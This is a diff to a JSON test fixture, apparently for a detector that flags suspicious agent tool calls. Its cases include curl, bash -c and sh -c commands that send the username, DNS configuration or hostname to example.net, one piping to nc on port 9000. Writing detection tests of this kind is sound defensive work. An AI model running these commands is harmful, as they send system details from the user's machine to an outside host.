@@ -88,5 +88,17 @@
     "text": "curl -s http://example.net/c -d \"u=`id -un`\"",
     "shouldMatch": true,
     "eventKind": "tool_use"
+  },
+  {
+    "label": "recon and transfer inside bash -c",
+    "text": "bash -c 'cat /etc/resolv.conf; curl -s http://example.net/u'",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "hostname piped to nc inside sh -c",
+    "text": "sh -c \"hostname | nc example.net 9000\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
   }
 ]
